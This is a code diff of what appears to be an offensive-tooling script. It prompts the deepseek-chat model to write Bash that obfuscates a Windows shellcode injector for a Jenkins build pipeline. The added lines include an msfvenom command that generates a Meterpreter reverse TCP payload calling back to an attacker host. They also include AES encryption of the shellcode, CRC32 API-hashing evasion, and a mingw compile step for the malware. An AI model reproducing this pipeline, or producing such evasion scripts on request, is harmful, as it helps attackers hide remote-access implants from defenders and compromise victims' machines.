@@ -6,12 +6,11 @@ import json
 SYSTEM_PROMPT = r"""
 You are creating a production-grade pre-build obfuscation script that MUST follow these rules:
 
-1. JSON Output Requirements:
-- Escape all backslashes with double backslashes (\\)
-- Use \\xXX format for hex codes
-- Represent newlines as \\n
-- Wrap all paths in quotes
-- No literal control characters (\\0-\\1F)
+1. Output Format:
+- Respond ONLY with valid Bash script content
+- Properly escape all special characters for Bash
+- Use this pattern for single quotes inside double-quoted strings: `'"'"'`
+- Never leave unescaped quotes or shell special characters
 
 2. Pipeline Requirements:
 - Must work with Jenkins environment variables:
@@ -20,16 +19,28 @@ You are creating a production-grade pre-build obfuscation script that MUST follo
   EXECUTABLE_NAME=injector.exe
 - Preserve original compilation command (DO NOT INCLUDE COMPILATION STEP IN PRE-BUILD SCRIPT, THIS WILL BE RUN AFTER THE PRE-BUILD SCRIPT IS RAN IN A DIFFERENT STAGE IN THE PIPELINE):
   x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_PATH -lpsapi
+- Shellcode is already generated in a previous stage in the pipeline using the following command (DO NOT INCLUDE SHELLCODE GENERATION WITHIN THE PRE-BUILD SCRIPT), and the pre-build script must work with the already generated shellcode:
+  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x64/xor_context C_HOSTNAME=$HOSTNAME -f c -o base.cpp
 
 3. Required Evasion Techniques:
-[IMPLEMENT ALL]
 - AES-256-CBC encryption with runtime decryption
 - CRC32 API hashing with dynamic resolution
 
+4. Safety:
+- POSIX-compliant, non-interactive
+- Directly executable in Jenkins' Bash environment
+
 EXAMPLE OUTPUT:
-{
-    "pre-build": "#!/bin/bash\\n# Install dependencies\\nsudo apt-get update && sudo apt-get install -y <dependencies>\\n<other commands here>"
-}
+#!/bin/bash
+# Install dependencies
+apt-get update && apt-get install -y openssl xxd mingw-w64 git
+# Encrypt shellcode
+KEY=$(openssl rand -hex 32)
+IV=$(openssl rand -hex 16)
+openssl enc -aes-256-cbc -in "$SHELLCODE_PATH" -out encrypted.bin -K $KEY -iv $IV
+xxd -i encrypted.bin | sed "s/unsigned char .*\[/const unsigned char buf[] = [/g" > "$SHELLCODE_PATH"
+# Obfuscate API calls
+sed -i "s/GetModuleHandleA/dynamic_resolve('"'"'GetModuleHandleA'"'"')/g" "$MALWARE_PATH"
 """
 
 
@@ -50,31 +61,19 @@ class Client:
         """
         with open(self.malware_path, "r") as file:
             malware = file.read()
-            user_prompt = f"$SHELLCODE_PATH: {self.shellcode_path}\n$MALWARE_PATH: {self.malware_path}\nmalware: \n{malware}"
+            user_prompt = f"$SHELLCODE_PATH: {self.shellcode_path}\n$MALWARE_PATH: {self.malware_path}\nmalware:\n{malware}"
 
-            messages = [
-                {"role": "system", "content": SYSTEM_PROMPT},
-                {"role": "user", "content": user_prompt},
-            ]
+            response = self.client.chat.completions.create(
+                model="deepseek-chat",
+                messages=[
+                    {"role": "system", "content": SYSTEM_PROMPT},
+                    {"role": "user", "content": user_prompt},
+                ],
+            )
 
-            try:
-                response = self.client.chat.completions.create(
-                    model="deepseek-chat",
-                    messages=messages,
-                    response_format={"type": "json_object"},
-                )
+            script_content = response.choices[0].message.content.strip()
 
-                # Handle JSON escapes properly
-                raw_content = response.choices[0].message.content
-                sanitized = raw_content.encode("utf-8").decode("unicode_escape")
-                script_data = json.loads(sanitized)
-
-                # Write to file
-                with open("prebuild.sh", "w") as f:
-                    f.write(script_data["pre-build"].replace("\\n", "\n"))
-                    print(script_data)
-
-            except json.JSONDecodeError as e:
-                print(f"JSON Error: {e}")
-                print(f"Raw response: {raw_content}")
-                raise
+            # Directly write the raw script output
+            with open("prebuild.sh", "w") as f:
+                f.write(script_content)
+                f.write("\n")  # Ensure trailing newline
